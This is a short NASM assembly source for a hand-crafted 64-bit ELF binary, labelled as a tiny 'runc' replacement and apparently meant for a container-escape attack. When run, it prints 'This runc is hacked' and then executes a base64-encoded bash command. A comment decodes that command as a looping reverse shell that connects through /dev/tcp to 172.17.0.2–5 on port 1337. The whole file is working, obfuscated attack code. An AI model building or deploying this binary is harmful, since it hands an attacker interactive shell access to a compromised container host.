; smoll runc <4k ELF
; Author: jpts
[bits 64]

file_load_va: equ 4096 * 40

db 0x7f, 'E', 'L', 'F'
db 2
db 1
db 1
db 0
dd 0
db 'j', 'p', 't', 's'
dw 2
dw 0x3e
dd 1
dq entry_point + file_load_va
dq program_headers_start
dq 0
dd 0
dw 64
dw 0x38
dw 1
dw 0x40
dw 0
dw 0

program_headers_start:
dd 1
dd 5
dq 0
dq file_load_va
dq file_load_va
dq file_end
dq file_end
dq 0x200000

entry_point:
    xor rax, rax
    xor rdi, rdi
    xor rsi, rsi
    xor rdx, rdx

    mov al, 0x1
    mov rdi, 0x1
    mov rsi, file_load_va + msg
    mov rdx, msgl
    syscall

    xor rdx, rdx
    mov al, 0x3b
    mov rdi, file_load_va + bash
    push rdx
    push file_load_va + payload
    push file_load_va + dashc
    push file_load_va + bash
    mov rsi, rsp
    syscall

    mov rax, 0x3c ; exit syscall
    mov rdi, 0x0  ; code
    syscall

msg: db `This runc is hacked 😱\n`, 0
msgl: equ $-msg

bash: db `/bin/bash`, 0
dashc: db `-c`, 0
; $'while :; do for i in {2..5}; do bash -i >& /dev/tcp/172.17.0.$i/1337 0>&1; done; sleep 2; done'
payload: db `echo "d2hpbGUgOjsgZG8gZm9yIGkgaW4gezIuLjV9OyBkbyBiYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xNy4wLiRpLzEzMzcgMD4mMTsgZG9uZTsgc2xlZXAgMjsgZG9uZQo="|base64 -d|bash`, 0

file_end:
